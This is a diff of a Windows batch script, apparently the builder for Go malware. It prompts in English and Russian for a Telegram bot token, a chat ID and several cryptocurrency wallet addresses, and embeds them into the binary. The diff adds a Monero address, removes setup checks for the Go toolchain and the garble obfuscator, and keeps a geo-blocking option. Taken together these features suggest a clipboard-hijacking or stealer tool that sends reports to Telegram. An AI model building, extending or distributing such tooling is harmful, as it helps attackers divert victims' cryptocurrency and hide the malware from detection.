@@ -12,29 +12,6 @@ echo   ^| ^|  ^| ^|_^| ^| ^| ^| ^| (_^| ^|
 echo   ^|_^|   \__,_^|_^| ^|_^ \__,_^| builder
 echo.
 
-where go >nul 2>&1
-if %errorlevel%==0 (
-    rem installed
-) else (
-    echo Go not found. Install go and add it to PATH / Go не найден. Установите Go и добавьте его в PATH.
-    echo Visit https://go.dev/dl/ for download / Перейдите на https://go.dev/dl/ для скачивания
-    pause
-    exit /b 1
-)
-
-where garble >nul 2>&1
-if %errorlevel%==0 (
-    rem installed
-) else (
-    go install mvdan.cc/garble@latest
-
-    if errorlevel 1 (
-        echo Failed to install garble / Ошибка при установке garble
-        pause
-        exit /b 1
-    )
-)
-
 echo.
 set /p "BOT_TOKEN=Bot token / Токен бота: "
 set /p "CHAT_ID=Chat ID or Group ID / Ваш чат ID или ID группы: "
@@ -48,6 +25,7 @@ set /p "DOGE=DOGE address / Адрес DOGE: "
 set /p "TON=TON address / Адрес TON: "
 set /p "USDT=USDT TRC address / Адрес USDT TRC: "
 set /p "SOL=SOL address / Адрес SOL: "
+set /p "XMR=XMR address / Адрес XMR: "
 
 echo.
 
@@ -85,6 +63,7 @@ set "LDFLAGS=%LDFLAGS% -X main.DogeAddr=%DOGE%"
 set "LDFLAGS=%LDFLAGS% -X main.TonAddr=%TON%"
 set "LDFLAGS=%LDFLAGS% -X main.UsdtTrcAddr=%USDT%"
 set "LDFLAGS=%LDFLAGS% -X main.SolAddr=%SOL%"
+set "LDFLAGS=%LDFLAGS% -X main.XmrAddr=%XMR%"
 set "LDFLAGS=%LDFLAGS% -X main.SteamAddr=%STEAM%"
 
 if defined GEO_BLOCK (
